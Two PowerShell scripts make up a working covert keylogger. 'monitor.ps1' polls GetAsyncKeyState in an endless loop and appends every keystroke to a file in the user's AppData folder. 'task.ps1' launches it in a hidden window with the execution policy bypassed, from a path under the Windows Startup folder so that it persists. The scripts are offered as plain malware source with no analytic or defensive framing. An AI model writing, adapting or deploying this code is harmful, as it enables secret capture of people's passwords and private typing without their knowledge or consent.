# monitor.ps1 - The Silent Sponge
$logPath = "C:\Users\339674087\AppData\Roaming\logs.txt"
Add-Type -AssemblyName System.Windows.Forms

# This hook captures keys in the background
$code = @"
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
"@
$null = Add-Type -MemberDefinition $code -Name "Win32" -Namespace Win32
while($true) {
    for($i=8;$i -lt 190;$i++) {
        if([Win32.Win32]::GetAsyncKeyState($i) -eq -32767) {
            [char][int]$i | Out-File $logPath -Append
        }
    }
    Start-Sleep -Milliseconds 5
}



# task.ps1 - The Orchestrator
# Starts the keylogger hidden
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Debug\monitor.ps1`"" -WindowStyle Hidden
